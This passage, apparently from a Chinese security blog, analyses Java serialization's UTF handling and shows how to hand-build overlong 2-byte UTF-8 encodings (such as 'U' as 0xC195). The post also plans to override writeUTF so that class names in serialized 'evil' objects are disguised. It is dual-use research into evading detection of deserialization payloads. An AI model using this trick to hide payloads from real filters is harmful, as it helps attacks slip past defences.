</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sbuf</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">cpos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">start</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><blockquote>
<p>这里看到下图，每次while会从<code>buf数据流</code>里取一个字符和<code>0xFF做&amp;运算</code>，然后<code>b1右移动4位</code>，就是<code>b1</code>去掉<code>右边后4位</code>剩下的二进制的10进制在<code>0-7</code>的范围就是属于<code>1byte</code>的，为什么是这个范围呢<code>10000000</code>是<code>128</code>，<code>0xxxxxxx</code>刚好就是<code>(0-127)</code>,熟悉ascii就知道这个范围包含<code>正常可打印字符范围(32-126)</code></p>
</blockquote>
<p>这里还是举个例子吧 eg:</p>
<p><code>'a'</code>的二进制是<code>01100001</code>，经过<code>&gt;&gt;4</code>运算后为<code>0110</code>，10进制是<code>6</code>会进入<code>case 6:</code>也就是<code>1byte</code></p>
<p><img loading="lazy" src="../images/image-20241212093848728.png" alt="image-20241212093848728"  />
</p>
<p>这里很容易发现<code>2byte</code>可能存在问题，我先不讲这个，这里我先想到的是没有<code>case8:</code>啊！！！那<code>ascii 128</code>怎么办</p>
<h3 id="128-欧元符号">128 欧元符号<a hidden class="anchor" aria-hidden="true" href="#128-欧元符号">#</a></h3>
<p><img loading="lazy" src="../images/image-20241212100247026.png" alt="image-20241212100247026"  />
</p>
<p>128正式我们的<code>欧元符号€</code>，这里方便分析我直接改了evil类名，发现是可以用的</p>
<p><img loading="lazy" src="../images/image-20241212100352223.png" alt="image-20241212100352223"  />
</p>
<p>生成的文件，我们发现<code>€</code>在java中其实对应<code>3byte</code>，因为他的<code>uincode编码</code>是<code>U+20AC</code>，这里按照上面转换表，这里突然加深了对表中<code>xxx</code>的理解</p>
<p>这里<code>xxx一共16位</code>，<code>20AC</code>的二进制也是16位，然后填入后生成的3byte就是他的utf-8，（hhh之前没注意这个，刚刚想16位怎么24位的时候看到这个恍然大悟hhh</p>
<blockquote>
<p>U+0800  U+FFFF  1110xxxx  10xxxxxx  10xxxxxx</p>
</blockquote>
<p><code>20AC</code>的二进制<code>0010000010101100</code> &ndash;&gt; utf-8: <code>11100010 10000010 10101100</code></p>
<p>及<code>E282AC</code>对应着序列化生成的内容，说明没错，所以不能按照ascii码的思维去想utf-8编码，<code>反序列化</code>中是按<code>照uincode转化为utf-8</code></p>
<p><img loading="lazy" src="../images/image-20241212100540540.png" alt="image-20241212100540540"  />
</p>
<p>既然都到这了，就简单分析下，3byte他是怎么转化的吧</p>
<h3 id="3byte">3byte<a hidden class="anchor" aria-hidden="true" href="#3byte">#</a></h3>
<p>这里对应的是<code>-30，-126，-84</code>这里存储都是<code>补码</code>，及最高位位1时，补码和原码不同，这里这三最高位都是<code>1</code>，所以这里补码显示出来都是负数和原码不同</p>
<p><img loading="lazy" src="../images/image-20241212104003554.png" alt="image-20241212104003554"  />
</p>
<p>这里就是简单分析下代码逻辑，这里识别到第一个字符是<code>1110</code>开头后=<code>case14:</code>,然后这里b3和b2会获取后两位<code>byte</code>，这里<code>pos+0</code>是因为前面获取b1时<code>b1 = buf[pos++] &amp; 0xFF;</code>，pos用的<code>后++</code>所以pos定位符已经向后了一位</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if ((b2 &amp; 0xC0) != 0x80 || (b3 &amp; 0xC0) != 0x80) {
</span></span></code></pre></div><p>这个是<code>检测 b2 b3</code>是不是以<code>10xx xxxx</code>的格式，<code>C0</code>是<code>1100 0000</code>，跟他做<code>&amp;</code>只有10xx xxxx的格式才会==0x80</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(((</span><span class="n">b1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="p">((</span><span class="n">b3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">))</span><span class="w">
</span></span></span></code></pre></div><p>然后看到这一段，其实就是恢复<code>€的uincode编码的二进制</code>，这里想成二进制就很好理解了</p>
<p>这里<code>b1 &amp; 0000 1111</code> 得到就是<code>0000 0010</code>然后向左移动12位 <code>0010 0000 0000 0000</code> 这不是就uincode编码二进制前4位么，然后最后进行<code>or运算</code>，不就是得到<code>完整的uincode编码的二进制</code>么，然后<code>10进制是8364</code>再<code>char</code>转换成字符</p>
<h3 id="real-128">real 128<a hidden class="anchor" aria-hidden="true" href="#real-128">#</a></h3>
<blockquote>
<p>但是我们意识到<code>€</code>只是ascii中的128，并不是uincode中的128，及<code>u+0080</code>，跟我们想要分析的东西貌似有点不一样，所以我们直接看看如果是128，java是怎么生成的</p>
</blockquote>
<p>根据<code>getUTFLength()</code>代码我们可以知道128是会走到<code>2byte</code>的</p>
<p>这里发现会生成两个byte 194 和 130   11000010 10000010都是符合转码规则的，并不会出现我们想象中utf-8 128去转uincode没对应<code>case8：</code>的情况，因为存储为utf-8编码的时候根本不是128，想多了hhh（128utf-8本身就不合法）</p>
<p><img loading="lazy" src="../images/image-20241216161152771.png" alt="image-20241216161152771"  />
</p>
<h2 id="0x04-开始构造">0x04 开始构造<a hidden class="anchor" aria-hidden="true" href="#0x04-开始构造">#</a></h2>
<p><img loading="lazy" src="../images/image-20241212152019226.png" alt="image-20241212152019226"  />
</p>
<p>2byte代码逻辑其实都不用看了，跟3byte差不了多少，就是让xxx里面的东西和我们要<code>构造的二进制</code>一样就行了，但是我们一般构造的都是可打印字符，一般只有8位2进制，这里xxx有11位，简单<code>前面填0</code>就好</p>
<p><img loading="lazy" src="../images/image-20241212152352346.png" alt="image-20241212152352346"  />
</p>
<p>这个拿<code>U</code>实验，二进制是<code>0101 0101</code> 填3个0 <code>000 0101 0101</code>，然后按照2byte格式得到 <code>11000001 10010101</code> 及<code>、0xC195</code></p>
<p><img loading="lazy" src="../images/image-20241212153213727.png" alt="image-20241212153213727"  />
</p>
<p>我们将<code>U</code>替换成<code>2byte</code>，看到下图成功实现</p>
<p><img loading="lazy" src="../images/image-20241212153338851.png" alt="image-20241212153338851"  />
</p>
<p><img loading="lazy" src="../images/image-20241212153422195.png" alt="image-20241212153422195"  />
</p>
<p>但是l没加载出来因为<code>2byte要占用两个长度</code>，而utflen还是原来的长度，所以让其+1就好</p>
<p>其实不难想到既然反序列化是将utf-8转化成uincode，那<code>序列化</code>其实就是将<code>uincode转化成utf-8编码</code>存储的</p>
<h3 id="writeutf">writeUTF<a hidden class="anchor" aria-hidden="true" href="#writeutf">#</a></h3>
<p>我们简单调试下就能发现<code>writeUTF</code>这个方法是用来转化编码存储的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">writeUTF</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">getUTFLength</span><span class="p">(</span><span class="n">s</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTF</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0xFFFFL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">writeShort</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">utflen</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeBytes</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeUTFBody</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>这里我想构造的是2byte的数据，所以这里<code>if (utflen == (long) s.length()) {</code>肯定是<code>false</code>，进入<code>writeUTFBody</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeUTFBody</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">limit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_BLOCK_SIZE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">limit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">2</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="c1">// write one byte at a time to normalize block</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0xE0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0xC0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">write</span><span class="p">(</span><span class="n">0x80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>在这里代码我们很容易就发现是将<code>uincode编码转化成utf-8编码</code>的格式，只是有范围判定，我当时第一反应就是<code>重写这个方法</code>，把这个范围改了，不就能让java帮我们<code>2byte编码</code>了么hh</p>
<p>还有个点就是长度 通过<code>getUTFLength()</code>返回，也跟范围有关，那把这个也重写不就行啦hh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">long</span><span class="w"> </span><span class="nf">getUTFLength</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">csize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">s</span><span class="p">.</span><span class="na">getChars</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">csize</span><span class="p">,</span><span class="w"> </span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w"> </span><span class="n">cpos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0x0001</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x007F</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">utflen</span><span class="o">++</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0x07FF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">utflen</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">csize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">utflen</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
